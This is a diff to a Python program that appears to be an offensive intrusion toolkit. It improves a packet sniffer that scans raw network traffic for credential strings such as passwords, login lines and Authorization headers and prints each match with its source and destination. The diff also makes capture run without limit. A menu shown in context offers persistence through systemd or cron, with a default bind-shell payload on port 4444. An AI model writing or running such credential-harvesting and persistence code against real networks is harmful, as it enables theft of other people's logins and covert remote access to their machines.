@@ -21,6 +21,7 @@ import concurrent.futures
 import platform
 import struct
 import hashlib
+import re
 from datetime import datetime
 
 # Import agent and client modules
@@ -367,12 +368,25 @@ def sniff(
                     
                     try:
                         decoded = payload.decode('utf-8', errors='ignore')
-                        clean_text = "".join(char for char in decoded if char.isprintable() or char in ['\n', '\r'])
+                        # 1. Clean ANSI Escape Codes (Colors)
+                        clean_text = re.sub(r'\x1b\[[0-9;]*m', '', decoded)
                         
-                        keywords = ["USER", "PASS", "LOGIN", "PASSWORD", "ADMIN"]
+                        # 2. Define Ignore List (Noise)
+                        ignore_terms = ["User-Agent:", "Mozilla/", "Docker-Client", "Containerd"]
+                        
+                        # 3. Define Specific Keywords
+                        keywords = ["USER=", "PASS=", "PASSWORD=", "LOGIN", "Authorization", "USER ", "PASS ", "admin"]
                         
                         for line in clean_text.splitlines():
-                            if any(key in line.upper() for key in keywords) and len(line) < 200:
+                            line = line.strip()
+                            if not line: continue
+                            
+                            # Skip Noise
+                            if any(ign in line for ign in ignore_terms):
+                                continue
+
+                            # Check for Credentials
+                            if any(key in line for key in keywords) and len(line) < 200:
                                 line_hash = hashlib.md5(line.encode()).hexdigest()
                                 if line_hash == last_payload_hash:
                                     continue
@@ -380,7 +394,7 @@ def sniff(
                                 last_payload_hash = line_hash
                                 console.print(f"\n[bold red]ALERT: Sensitive Data![/bold red]")
                                 console.print(f"From: {socket.inet_ntoa(iph[8])}:{src_port} -> {socket.inet_ntoa(iph[9])}:{dest_port}")
-                                console.print(Panel(line.strip(), style="yellow"))
+                                console.print(Panel(line, style="yellow"))
                                 captured += 1
                                 break
                     except:
@@ -473,7 +487,7 @@ def menu():
                 Prompt.ask("\nPress Enter...")
             elif choice == "7":
                 interface = Prompt.ask("Interface", default="eth0")
-                sniff(interface=interface)
+                sniff(interface=interface, count=0)
             elif choice == "8":
                 method = Prompt.ask("Method", choices=["systemd", "cron"], default="systemd")
                 payload = Prompt.ask("Payload", default="bind_shell --port 4444")
